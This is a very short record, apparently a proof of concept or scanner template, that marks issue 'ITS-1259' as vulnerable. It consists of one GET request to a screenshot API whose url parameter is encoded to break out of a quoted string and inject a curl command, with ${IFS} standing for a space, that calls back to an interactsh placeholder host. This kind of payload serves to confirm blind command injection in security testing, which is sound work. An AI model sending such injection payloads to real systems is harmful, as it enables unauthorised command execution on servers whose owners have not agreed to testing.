# Vulnerable: ITS-1259
GET /api/screenshot?url=http://x%22%3bcurl${IFS}http://{{interactsh-url}}%3b%23
